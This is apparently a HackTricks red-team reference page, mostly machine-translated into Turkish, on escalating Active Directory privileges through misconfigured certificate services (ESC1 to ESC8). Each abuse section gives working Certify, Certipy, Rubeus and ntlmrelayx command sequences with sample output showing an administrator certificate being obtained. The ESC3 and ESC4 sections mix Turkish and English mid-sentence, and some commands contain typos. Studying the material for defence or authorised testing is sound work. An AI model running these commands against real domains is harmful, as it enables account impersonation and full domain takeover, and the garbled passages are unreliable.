# AD CS Domain Escalation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Bu, gönderilerin yükseltme teknikleri bölümlerinin bir özetidir:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Yanlış Yapılandırılmış Sertifika Şablonları - ESC1

### Açıklama

### Yanlış Yapılandırılmış Sertifika Şablonları - ESC1 Açıklaması

* **Kayıt hakları, Kurumsal CA tarafından düşük ayrıcalıklı kullanıcılara verilmektedir.**
* **Yönetici onayı gerekmemektedir.**
* **Yetkili personelden imza gerekmemektedir.**
* **Sertifika şablonlarındaki güvenlik tanımlayıcıları aşırı izinlidir, bu da düşük ayrıcalıklı kullanıcıların kayıt hakları elde etmesine olanak tanır.**
* **Sertifika şablonları, kimlik doğrulamayı kolaylaştıran EKU'ları tanımlamak için yapılandırılmıştır:**
* Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU yok (SubCA) gibi Genişletilmiş Anahtar Kullanımı (EKU) tanımlayıcıları dahildir.
* **Sertifika İmzalama Talebi (CSR) içinde subjectAltName ekleme yeteneği şablon tarafından izin verilmektedir:**
* Active Directory (AD), bir sertifikada kimlik doğrulama için subjectAltName (SAN) varsa öncelik verir. Bu, CSR'de SAN belirterek, herhangi bir kullanıcıyı (örneğin, bir alan yöneticisi) taklit etmek için bir sertifika talep edilebileceği anlamına gelir. Talep edenin bir SAN belirleyip belirleyemeyeceği, sertifika şablonunun AD nesnesinde `mspki-certificate-name-flag` özelliği aracılığıyla gösterilmektedir. Bu özellik bir bitmask'tır ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağının varlığı, talep edenin SAN'ı belirtmesine izin verir.

{% hint style="danger" %}
Açıklanan yapılandırma, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile sertifika talep etmelerine izin vererek, Kerberos veya SChannel aracılığıyla herhangi bir alan ilkesinin kimliğini doğrulamalarını sağlar.
{% endhint %}

Bu özellik, bazen ürünler veya dağıtım hizmetleri tarafından HTTPS veya ana bilgisayar sertifikalarının anında oluşturulmasını desteklemek için veya anlayış eksikliği nedeniyle etkinleştirilir.

Bu seçeneği kullanarak bir sertifika oluşturmanın bir uyarı tetiklediği, ancak mevcut bir sertifika şablonunun (örneğin, `WebServer` şablonu, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin) kopyalanıp ardından bir kimlik doğrulama OID'si eklemek için değiştirilmesi durumunda böyle bir durumun söz konusu olmadığı belirtilmiştir.

### Kötüye Kullanım

**Zayıf sertifika şablonlarını bulmak için** şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Bu **açığı kötüye kullanarak bir yöneticiyi taklit etmek için** şunu çalıştırabilirsiniz:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Sonra oluşturulan **sertifikayı `.pfx`** formatına dönüştürebilir ve bunu **Rubeus veya certipy** kullanarak tekrar **kimlik doğrulamak için** kullanabilirsiniz:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Ormanı'nın yapılandırma şemasındaki sertifika şablonlarının, özellikle onay veya imza gerektirmeyen, Client Authentication veya Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` bayrağı etkin olanların sayımı, aşağıdaki LDAP sorgusunu çalıştırarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Sertifika Şablonları - ESC2

### Açıklama

İkinci kötüye kullanım senaryosu, birincisinin bir varyasyonudur:

1. Kayıt hakları, Kurumsal CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
2. Yönetici onayı gerekliliği devre dışı bırakılmıştır.
3. Yetkili imzaların gerekliliği atlanmıştır.
4. Sertifika şablonundaki aşırı izinli bir güvenlik tanımlayıcısı, düşük ayrıcalıklı kullanıcılara sertifika kayıt hakları verir.
5. **Sertifika şablonu, Any Purpose EKU'yu veya hiç EKU'yu içerecek şekilde tanımlanmıştır.**

**Any Purpose EKU**, bir saldırganın **herhangi bir amaçla**, istemci kimlik doğrulaması, sunucu kimlik doğrulaması, kod imzalama vb. dahil olmak üzere bir sertifika almasına izin verir. Bu senaryoyu istismar etmek için **ESC3 için kullanılan aynı teknik** uygulanabilir.

**Hiç EKU'su olmayan** sertifikalar, alt CA sertifikaları olarak hareket eder ve **herhangi bir amaçla** istismar edilebilir ve **yeni sertifikaları imzalamak için de kullanılabilir**. Bu nedenle, bir saldırgan, bir alt CA sertifikası kullanarak yeni sertifikalarda keyfi EKU'lar veya alanlar belirleyebilir.

Ancak, **alan kimlik doğrulaması** için oluşturulan yeni sertifikalar, alt CA **`NTAuthCertificates`** nesnesi tarafından güvenilir değilse çalışmayacaktır; bu varsayılan ayardır. Yine de, bir saldırgan **herhangi bir EKU** ve keyfi sertifika değerleri ile **yeni sertifikalar** oluşturabilir. Bunlar, potansiyel olarak geniş bir yelpazede amaçlar için **kötüye kullanılabilir** (örneğin, kod imzalama, sunucu kimlik doğrulaması vb.) ve SAML, AD FS veya IPSec gibi ağdaki diğer uygulamalar için önemli sonuçlar doğurabilir.

AD Ormanı'nın yapılandırma şemasında bu senaryoya uyan şablonları listelemek için aşağıdaki LDAP sorgusu çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Kayıt Ajanı Şablonları - ESC3

### Açıklama

Bu senaryo, birinci ve ikinci senaryoya benzer ancak **farklı bir EKU** (Sertifika Talep Ajanı) ve **2 farklı şablon** **istismar** etmektedir (bu nedenle 2 set gereksinimi vardır).

**Sertifika Talep Ajanı EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft belgelerinde **Kayıt Ajanı** olarak bilinir, bir kullanıcının **başka bir kullanıcı adına** **sertifika** için **kayıt** olmasına izin verir.

**“kayıt ajanı”**, böyle bir **şablona** kayıt olur ve elde edilen **sertifikayı diğer kullanıcı adına bir CSR'yi eş imzalamak için kullanır**. Daha sonra **eş imzalı CSR'yi** CA'ya **gönderir**, **“adına kayıt olma”** izni veren bir **şablona** kayıt olur ve CA, **“diğer” kullanıcıya ait bir sertifika** ile yanıt verir.

**Gereksinimler 1:**

* Kayıt hakları, Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara verilir.
* Yönetici onayı gereksinimi atlanmıştır.
* Yetkili imzalar için bir gereksinim yoktur.
* Sertifika şablonunun güvenlik tanımlayıcısı aşırı derecede izin vericidir, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
* Sertifika şablonu, diğer ilkeler adına diğer sertifika şablonlarının talep edilmesini sağlayan Sertifika Talep Ajanı EKU'sunu içerir.

**Gereksinimler 2:**

* Enterprise CA, düşük ayrıcalıklı kullanıcılara kayıt hakları verir.
* Yönetici onayı atlanmıştır.
* Şablonun şema versiyonu ya 1'dir ya da 2'yi aşar ve Sertifika Talep Ajanı EKU'sunu gerektiren bir Uygulama Politikası Yayınlama Gereksinimi belirtir.
* Sertifika şablonunda tanımlanan bir EKU, alan kimlik doğrulamasına izin verir.
* Kayıt ajanları için kısıtlamalar CA üzerinde uygulanmamaktadır.

### İstismar

Bu senaryoyu istismar etmek için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **kullanıcılar** who are allowed to **almak** an **kayıt ajanı sertifikası**, the templates in which enrollment **ajanları** are permitted to enroll, and the **hesaplar** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **sağa tıklayarak CA'ya**, **Özellikler**'e tıklayarak, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **varsayılan** setting for CAs is to “**Kayıt ajanlarını kısıtlamayın**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Kayıt ajanlarını kısıtla,” the default configuration remains extremely permissive. It allows **Herkes** access to enroll in all templates as anyone.

## Vulnerable Certificate Template Access Control - ESC4

### **Açıklama**

The **güvenlik tanımlayıcısı** on **sertifika şablonları** defines the **izinler** specific **AD ilkeleri** possess concerning the template.

Should an **saldırgan** possess the requisite **izinler** to **değiştirmek** a **şablon** and **kurmak** any **istismar edilebilir yanlış yapılandırmalar** outlined in **önceki bölümler**, privilege escalation could be facilitated.

Notable permissions applicable to certificate templates include:

* **Sahip:** Grants implicit control over the object, allowing for the modification of any attributes.
* **TamKontrol:** Enables complete authority over the object, including the capability to alter any attributes.
* **YazmaSahibi:** Permits the alteration of the object's owner to a principal under the attacker's control.
* **YazmaDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
* **YazmaÖzellik:** Authorizes the editing of any object properties.

### Abuse

An example of a privesc like the previous one:

<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, bir sertifika şablonunun yapılandırmasını tek bir komutla geçersiz kılabilir. **Varsayılan olarak**, Certipy yapılandırmayı **ESC1'e karşı savunmasız hale getirmek için geçersiz kılar**. Ayrıca, **saldırımızdan sonra yapılandırmayı geri yüklemek için eski yapılandırmayı kaydetmek üzere `-save-old` parametresini de belirtebiliriz**.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### Açıklama

Sertifika şablonları ve sertifika otoritesinin ötesinde birkaç nesneyi içeren, ACL tabanlı ilişkilerin geniş ağı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

* CA sunucusunun AD bilgisayar nesnesi, S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla tehlikeye girebilir.
* CA sunucusunun RPC/DCOM sunucusu.
* `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` belirli konteyner yolundaki herhangi bir alt AD nesnesi veya konteyner. Bu yol, Sertifika Şablonları konteyneri, Sertifikasyon Otoriteleri konteyneri, NTAuthCertificates nesnesi ve Kayıt Hizmetleri Konteyneri gibi konteynerler ve nesnelerle sınırlı olmamakla birlikte, bunları içerir.

PKI sisteminin güvenliği, düşük ayrıcalıklı bir saldırgan bu kritik bileşenlerden herhangi birine kontrol sağlamayı başarırsa tehlikeye girebilir.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy gönderisinde**](https://cqureacademy.com/blog/enhanced-key-usage) tartışılan konu, Microsoft tarafından belirtilen **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağının etkilerini de ele almaktadır. Bu yapılandırma, bir Sertifikasyon Otoritesi (CA) üzerinde etkinleştirildiğinde, **herhangi bir istek** için **konu alternatif adı** içinde **kullanıcı tanımlı değerlerin** dahil edilmesine izin verir; bu, Active Directory®'den oluşturulanları da içerir. Sonuç olarak, bu düzenleme, bir **saldırganın** alan **kimlik doğrulaması** için ayarlanmış **herhangi bir şablon** aracılığıyla kaydolmasına olanak tanır—özellikle, standart Kullanıcı şablonu gibi **ayrıca ayrıcalıksız** kullanıcı kaydına açık olanlar. Sonuç olarak, bir sertifika güvence altına alınabilir ve saldırganın alan yöneticisi veya alan içindeki **herhangi bir başka aktif varlık** olarak kimlik doğrulaması yapmasına olanak tanır.

**Not**: Sertifika İmzalama Talebi (CSR) içine **alternatif adların** eklenmesi için `certreq.exe` içindeki `-attrib "SAN:"` argümanı aracılığıyla kullanılan yaklaşım, ESC1'deki SAN'ların istismar stratejisinden bir **fark** sunar. Burada, fark, **hesap bilgilerinin nasıl kapsüllendiği** ile ilgilidir—bir sertifika niteliği içinde, bir uzantı yerine.

### Suistimal

Ayarın etkin olup olmadığını doğrulamak için, kuruluşlar `certutil.exe` ile aşağıdaki komutu kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esasen **uzaktan kayıt defteri erişimi** kullanır, bu nedenle alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar, bu yanlış yapılandırmayı tespit etme ve bunu istismar etme yeteneğine sahiptir:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain yönetici** haklarına veya eşdeğerine sahip olunduğu varsayılarak, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için, bayrak şu komutla kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Mayıs 2022 güvenlik güncellemelerinden sonra, yeni verilen **sertifikalar**, **istek sahibinin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** içerecektir. ESC1 için, bu SID belirtilen SAN'dan türetilir. Ancak, **ESC6** için, SID **istek sahibinin `objectSid`**'sini yansıtır, SAN'ı değil.\
ESC6'ı istismar etmek için, sistemin ESC10'a (Zayıf Sertifika Eşleştirmeleri) karşı hassas olması gerekmektedir; bu, **yeni güvenlik uzantısından ziyade SAN'ı** önceliklendirir.
{% endhint %}

## Zayıf Sertifika Otoritesi Erişim Kontrolü - ESC7

### Saldırı 1

#### Açıklama

Bir sertifika otoritesinin erişim kontrolü, CA eylemlerini yöneten bir dizi izin aracılığıyla sürdürülmektedir. Bu izinler, `certsrv.msc`'ye erişerek, bir CA'ya sağ tıklayarak, özellikleri seçerek ve ardından Güvenlik sekmesine giderek görüntülenebilir. Ayrıca, izinler PSPKI modülü kullanılarak şu komutlarla sıralanabilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, "CA yöneticisi" ve "Sertifika Yöneticisi" rollerine karşılık gelen **`ManageCA`** ve **`ManageCertificates`** gibi temel haklar hakkında bilgiler sunar.

#### Suistimal

Bir sertifika otoritesinde **`ManageCA`** haklarına sahip olmak, yetkilinin PSPKI kullanarak ayarları uzaktan manipüle etmesine olanak tanır. Bu, herhangi bir şablonda SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** bayrağını değiştirmeyi içerir; bu, alan yükseltmesinin kritik bir yönüdür.

Bu sürecin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişikliklere izin veren PSPKI’nin **Enable-PolicyModuleFlag** cmdlet'inin kullanımıyla mümkündür.

**`ManageCertificates`** haklarına sahip olmak, bekleyen taleplerin onaylanmasını kolaylaştırır ve "CA sertifika yöneticisi onayı" korumasını etkili bir şekilde aşar.

Bir **Certify** ve **PSPKI** modüllerinin kombinasyonu, bir sertifika talep etmek, onaylamak ve indirmek için kullanılabilir:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attack 2

#### Explanation

{% hint style="warning" %}
Önceki saldırıda **`Manage CA`** izinleri **ESC6 saldırısını** gerçekleştirmek için **EDITF\_ATTRIBUTESUBJECTALTNAME2** bayrağını **etkinleştirmek** için kullanıldı, ancak bu, CA hizmeti (`CertSvc`) yeniden başlatılmadıkça herhangi bir etki yaratmayacaktır. Bir kullanıcının `Manage CA` erişim hakkı olduğunda, kullanıcı aynı zamanda **hizmeti yeniden başlatma** iznine de sahiptir. Ancak, bu **kullanıcının hizmeti uzaktan yeniden başlatabileceği anlamına gelmez**. Ayrıca, **ESC6 çoğu yamanmış ortamda kutudan çıktığı gibi çalışmayabilir** çünkü Mayıs 2022 güvenlik güncellemeleri nedeniyle.
{% endhint %}

Bu nedenle, burada başka bir saldırı sunulmaktadır.

Gereksinimler:

* Sadece **`ManageCA` izni**
* **`Manage Certificates`** izni (bu **`ManageCA`** üzerinden verilebilir)
* Sertifika şablonu **`SubCA`** **etkinleştirilmiş** olmalıdır (bu **`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız sertifika talepleri** verebileceği gerçeğine dayanır. **`SubCA`** sertifika şablonu **ESC1'e** karşı **savunmasızdır**, ancak **yalnızca yöneticiler** şablona kaydolabilir. Böylece, bir **kullanıcı** **`SubCA`**'ya kaydolmak için **talep** edebilir - bu **reddedilecektir** - ancak **sonrasında yönetici tarafından verilecektir**.

#### Abuse

Kendinize **`Manage Certificates`** erişim hakkını, kullanıcıyı yeni bir yetkili olarak ekleyerek **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu, `-enable-template` parametresi ile CA üzerinde **etkinleştirilebilir**. Varsayılan olarak, `SubCA` şablonu etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Eğer bu saldırı için ön koşulları yerine getirmişsek, **`SubCA` şablonuna dayalı bir sertifika talep etmeye başlayabiliriz**.

**Bu talep reddedilecektir**, ancak özel anahtarı kaydedeceğiz ve talep kimliğini not alacağız.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`CA Yönet` ve `Sertifikaları Yönet`** ile, `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika** talebini **verebiliriz**.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve sonunda, `req` komutunu ve `-retrieve <request ID>` parametresini kullanarak **verilen sertifikayı** alabiliriz.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Açıklama

{% hint style="info" %}
**AD CS yüklü** olan ortamlarda, eğer **kötü niyetli bir web kayıt noktası** varsa ve en az bir **sertifika şablonu yayımlanmışsa** ve bu şablon **alan bilgisayarı kaydı ve istemci kimlik doğrulamasına** izin veriyorsa (varsayılan **`Machine`** şablonu gibi), **spooler servisi aktif olan herhangi bir bilgisayarın bir saldırgan tarafından tehlikeye atılması mümkün hale gelir**!
{% endhint %}

AD CS, yöneticilerin yükleyebileceği ek sunucu rolleri aracılığıyla sunulan birkaç **HTTP tabanlı kayıt yöntemi** desteklemektedir. HTTP tabanlı sertifika kaydı için bu arayüzler **NTLM relay saldırılarına** karşı hassastır. Bir saldırgan, **tehlikeye atılmış bir makineden, gelen NTLM aracılığıyla kimlik doğrulayan herhangi bir AD hesabını taklit edebilir**. Mağdur hesabını taklit ederken, bu web arayüzleri bir saldırgan tarafından **`User` veya `Machine` sertifika şablonlarını kullanarak bir istemci kimlik doğrulama sertifikası talep etmek için erişilebilir**.

* **Web kayıt arayüzü** (http://<caserver>/certsrv/ adresinde bulunan eski bir ASP uygulaması), varsayılan olarak yalnızca HTTP'yi destekler ve bu da NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca, yalnızca NTLM kimlik doğrulamasına izin vererek, Kerberos gibi daha güvenli kimlik doğrulama yöntemlerinin uygulanamaz hale gelmesine neden olur.
* **Sertifika Kayıt Servisi** (CES), **Sertifika Kayıt Politikası** (CEP) Web Servisi ve **Ağ Cihazı Kayıt Servisi** (NDES) varsayılan olarak, yetkilendirme HTTP başlıkları aracılığıyla müzakere kimlik doğrulamasını destekler. Müzakere kimlik doğrulaması **hem** Kerberos'u hem de **NTLM**'yi destekleyerek, bir saldırganın **NTLM** kimlik doğrulamasına geçiş yapmasına olanak tanır. Bu web hizmetleri varsayılan olarak HTTPS'yi etkinleştirse de, HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS hizmetleri için NTLM relay saldırılarına karşı koruma, HTTPS'nin kanal bağlama ile birleştirilmesiyle mümkündür. Ne yazık ki, AD CS, kanal bağlama için gerekli olan IIS'de Genişletilmiş Kimlik Doğrulama Korumasını etkinleştirmemektedir.

NTLM relay saldırılarındaki yaygın bir **sorun**, **NTLM oturumlarının kısa süresi** ve saldırganın **NTLM imzalamayı** gerektiren hizmetlerle etkileşimde bulunamamasıdır.

Yine de, bu sınırlama, bir kullanıcı için bir sertifika edinmek amacıyla bir NTLM relay saldırısını kullanarak aşılmaktadır, çünkü sertifikanın geçerlilik süresi oturumun süresini belirler ve sertifika, **NTLM imzalamayı** zorunlu kılan hizmetlerle kullanılabilir. Çalınan bir sertifikanın nasıl kullanılacağına dair talimatlar için bakınız:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

NTLM relay saldırılarının bir diğer sınırlaması, **bir saldırgan kontrolündeki makinenin bir mağdur hesabı tarafından kimlik doğrulanması gerektiğidir**. Saldırgan ya bekleyebilir ya da bu kimlik doğrulamayı **zorlamaya** çalışabilir:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Kötüye Kullanım**

[**Certify**](https://github.com/GhostPack/Certify)’nin `cas` komutu, **etkin HTTP AD CS uç noktalarını** listeler:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` özelliği, kurumsal Sertifika Otoriteleri (CA'lar) tarafından Sertifika Kaydı Servisi (CES) uç noktalarını depolamak için kullanılır. Bu uç noktalar, **Certutil.exe** aracını kullanarak ayrıştırılabilir ve listelenebilir:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify ile Suistimal
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuse with [Certipy](https://github.com/ly4k/Certipy)

Certipy, varsayılan olarak, iletilen hesap adının `$` ile bitip bitmediğine bağlı olarak `Machine` veya `User` şablonuna dayalı olarak bir sertifika talep eder. Alternatif bir şablonun belirtilmesi `-template` parametresi kullanılarak gerçekleştirilebilir.

Kimlik doğrulamasını zorlamak için [PetitPotam](https://github.com/ly4k/PetitPotam) gibi bir teknik kullanılabilir. Alan denetleyicileri ile çalışırken, `-template DomainController` belirtilmesi gereklidir.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
